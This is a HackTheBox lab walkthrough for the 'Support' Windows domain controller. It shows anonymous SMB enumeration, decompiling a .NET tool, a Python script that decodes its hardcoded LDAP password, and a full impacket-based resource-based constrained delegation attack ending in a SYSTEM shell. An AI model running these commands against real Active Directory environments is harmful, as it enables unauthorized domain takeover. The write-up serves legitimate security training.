---
title: "HackTheBox - Support"
published: true
---

| Field            | Details                                                                                   |
| ---------------- | ----------------------------------------------------------------------------------------- |
| **OS**           | Windows                                                                                   |
| **Difficulty**   | Easy                                                                                      |
| **Release Date** | 2022-07-30                                                                                |
| **Pwned Date**   | 2026-06-11                                                                                |
| **Tags**         | `kerberos` `ldap` `smb` `.NET decompilation` `winRM` `RBCD` `impacket` `active directory` |

## Summary

Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users. Through binary decompilation LDAP credentials are discovered and can be used to make further LDAP queries. A user called 'support' is identified in the users list, and the 'info' field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered. The Shared Support Accounts group that the support user is a member of, has GenericAll privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as NT Authority\System is received.

## Reconnaissance

### Port enumeration

Run port scanning

```bash
python portscan.py --target <TARGET_IP>
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/portscan.py). If you want to run standard commands run

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49688,49704 -oN service_scan.txt <TARGET_IP>
```

Expected output

```
[snip]
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-10 13:12:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
[snip]
```

The scan output contains references to a support.htb domain, add it to /etc/hosts:

```
<TARGET_IP>   support.htb
```

### SMB enumeration

The port scan found port 445 open, that is the default port for the SMB service.

Try to connect anonymously

```bash
smbclient -L //<TARGET_IP> -N
```

```
Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    support-tools   Disk      support staff tools
    SYSVOL          Disk      Logon server share
 Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.12.6 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The 'support-tools' share is non-default and potentially interesting.

List its contents

```shell
smbclient //<TARGET_IP>/support-tools -N
smb: \> ls
```

```
.                                   D        0  Wed Jul 20 13:01:06 2022
..                                  D        0  Sat May 28 07:18:25 2022
7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
putty.exe                           A  1273576  Sat May 28 07:20:06 2022
SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

            4026367 blocks of size 4096. 970232 blocks available
```

They are all standard tools except for **UserInfo.exe.zip**, download it locally.

```shell
smb: \> get UserInfo.exe.zip
```

```
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (1248.8 KiloBytes/sec) (average 1248.8 KiloBytes/sec)
```

Unzip it

```bash
unzip UserInfo.exe.zip
```

```
Archive:  UserInfo.exe.zip
inflating: UserInfo.exe

inflating: CommandLineParser.dll

inflating: Microsoft.Bcl.AsyncInterfaces.dll

inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll

inflating: Microsoft.Extensions.DependencyInjection.dll

inflating: Microsoft.Extensions.Logging.Abstractions.dll

inflating: System.Buffers.dll

inflating: System.Memory.dll

inflating: System.Numerics.Vectors.dll

inflating: System.Runtime.CompilerServices.Unsafe.dll

inflating: System.Threading.Tasks.Extensions.dll

inflating: UserInfo.exe.config
```

This is a .NET app, you can look at the UserInfo.exe.config file to double check.

.NET is based on C#, which is not compiled to machine code but to an intermediate bytecode (IL).

It may be possible to decompile the resulting bytecode to the original source code.

### .NET decompilation

Install the 'ilspycmd' dotnet tool for decompilation

```bash
dotnet tool install -g ilspycmd
```

Depending on your installed dotnet version you may need to install an older version of the tool with the --version flag (or upgrade your dotnet installation).

Example for dotnet v6.0

```bash
dotnet tool install -g ilspycmd --version 7.2.1.49
```

Decompile the exe

```bash
ilspycmd UserInfo.exe > UserInfo_decompiled.txt
```

### .NET analysis

The source code presents the following interesting elements

```c#
internal class Protected
{
        private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

        private static byte[] key = Encoding.ASCII.GetBytes("armando");

        public static string getPassword()
        {
                byte[] array = Convert.FromBase64String(enc_password);
                byte[] array2 = array;
                for (int i = 0; i < array.Length; i++)
                {
                        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
                }
                return Encoding.Default.GetString(array2);
        }
}
```

The 'enc_password' variable is a base64 encoded string and, with the key variable, is used in the getPassword function to build the actual password via a XOR operation.

```c#
public LdapQuery()
{
        //IL_0018: Unknown result type (might be due to invalid IL or missing references)
        //IL_0022: Expected O, but got Unknown
        //IL_0035: Unknown result type (might be due to invalid IL or missing references)
        //IL_003f: Expected O, but got Unknown
        string password = Protected.getPassword();
        entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
        entry.set_AuthenticationType((AuthenticationTypes)1);
        ds = new DirectorySearcher(entry);
}
```

The password is then used to access the LDAP service on the support.htb domain.

The logic of the getPassword function can be replicated to obtain the password used for the LDAP connection

Create a python script named 'ldap_password_decoder.py' with the following content

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

array = base64.b64decode(enc_password)
result = bytes([array[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(array))])
print(result.decode())
```

Run it and it will print the LDAP password

```bash
python ldap_password_decoder.py
```

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### LDAP enumeration

Use the password to query all users

```bash
ldapsearch -x -H ldap://<TARGET_IP> -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=user)"
```

You will get a very long output but the interesting line is

```
info: Ironside47pleasure40Watchful
```

The non-standard 'info' attribute contains the plaintext password for the 'support' user.

Looking further in the 'support' user properties you can find

```
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

The 'support' user is a member of the 'Remote Management Users' group, which means it could be possible to use the found password to establish a remote connection.

Looking back at the ports scan you can see that port 5985 is open, that is the default tcp port for winRM (Windows Remote Management) over HTTP.

## Initial Access

Connect to winRM using the evil-winrm tool

```bash
evil-winrm -i <TARGET_IP> -u support -p 'Ironside47pleasure40Watchful'
```

```
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
```

Remote access to the 'support' user was established.

## Privilege Escalation

Now you can use the remote access to further enumerate the system for privilege escalation vectors.

Looking back at the LDAP user enumeration output you can see that the 'support' user is also member of a 'Shared Support Accounts' group.

```
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
```

You can also confirm this with

```powershell
whoami /all
```

```
[snip]
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
[snip]
```

The 'Shared Support Accounts' is an Active Directory group, you can determine it by the syntax of the 'memberOf' line but also from the SID starting with 'S-1-5-21-'

### Active Directory enumeration

Check for permissions over the DC computer object

```powershell
$acl = Get-ACL "AD:CN=DC,OU=Domain Controllers,DC=support,DC=htb"
$acl.Access | Where-Object {$_.IdentityReference -like "*Support*"} | Select IdentityReference,ActiveDirectoryRights,ObjectType
```

```
[snip]
SUPPORT\Shared Support Accounts                  GenericAll 00000000-0000-0000-0000-000000000000
[snip]
```

The 'Shared Support Accounts' group has GenericAll rights over the DC object, the all zeroes ObjectType means this applies on the whole object, not just a specific attribute.

This allows to escalate the privileges using RBCD

### RBCD: Resource Based Constrained Delegation

Kerberos delegation allows a service to request tickets on behalf of a user to access other services.
RBCD lets the target computer decide who is allowed to do this, via an attribute called msDS-AllowedToActOnBehalfOfOtherIdentity.

GenericAll rights over the DC computer allow to write to that attribute so that a computer account controlled by you can impersonate other acconts, like Administrator.

The attack can be performed easily with the impacket tools.

Add a new computer account

```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' -computer-name 'FAKEBOX$' -computer-pass 'password'
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account FAKEBOX$ with password password.
```

Write delegation attribute on DC object

```bash
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' -delegate-from 'FAKEBOX$' -delegate-to 'DC$' -action write
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKEBOX$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKEBOX$     (S-1-5-21-1677581083-3380853377-188903654-6101)
```

Request ticket impersonating Administrator

```bash
impacket-getST support.htb/FAKEBOX$:'password' -spn 'cifs/dc.support.htb' -impersonate Administrator
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Before using the generated .ccache file to get a shell, add the dc.support.htb subdomain to /etc/hosts, otherwise the connection will fail

Change the line added previously in /etc/hosts to

```
<TARGET_IP>   dc.support.htb support.htb
```

Get shell

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file NrXuuXYI.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service xuye on dc.support.htb.....
[*] Starting service xuye.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Got SYSTEM access.
